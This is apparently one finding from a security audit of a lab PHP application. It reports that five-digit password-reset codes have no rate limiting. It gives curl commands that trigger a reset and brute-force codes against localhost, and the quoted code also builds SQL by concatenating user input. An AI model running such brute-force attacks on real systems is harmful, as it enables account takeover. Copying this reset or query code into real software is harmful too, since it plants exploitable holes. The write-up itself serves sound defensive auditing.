# 31 — No reset-code rate limiting

- **OWASP Top 10 (2021):** A07:2021 – Identification and Authentication Failures
- **Severity:** High
- **Difficulty:** Medium

## Where

`web/reset.php:37-53` — step 2 verification:

```php
$u = isset($_POST['username']) ? $_POST['username'] : '';
$c = isset($_POST['code']) ? $_POST['code'] : '';
...
$q = 'SELECT * FROM reset_codes WHERE username = \'' . $u . '\' AND code = \'' . $c . '\'';
```

The code is generated at `web/reset.php:23`:

```php
$code = sprintf('%05d', mt_rand(0, 99999));
```

## How it works (root cause)

Reset codes are only five decimal digits, and step 2 has **no attempt
limit**. An attacker who knows (or guesses) a username can brute-force the
code online. There is no lockout, no exponential delay, and no alerting.

## Exploitation steps

1. Trigger a reset for a known user:

   ```bash
   curl -s -o /dev/null --data 'step=1&who=ulla' http://127.0.0.1:8080/reset.php
   ```

2. Brute-force the five-digit code:

   ```bash
   for c in 00000 00001 00002 00003 00004; do
     curl -s -o /dev/null -w '%{http_code} ' \
       --data "step=2&username=ulla&code=$c" \
       http://127.0.0.1:8080/reset.php
   done
   ```

3. With only 100,000 possible values and no throttling, the full keyspace can
   be exhausted in a short time.

## Working PoC (verified)

Five wrong reset codes for `ulla` return:

```text
200 200 200 200 200
```

No lockout or rate limit is triggered.

## Expected result / verification

- The endpoint keeps accepting reset-code guesses.
- A correct code would advance to step 3 and allow a password change.

## Attack chain

```
known username
  → trigger reset
  → brute-force 5-digit code (no rate limit)
  → step 3 password reset → full account takeover
```

## Notes

- The code is also written to a world-readable log (20/26), so brute force is
  not even required on a shared host.
- A production reset flow needs a large random token, per-IP throttling, and
  one-time codes.
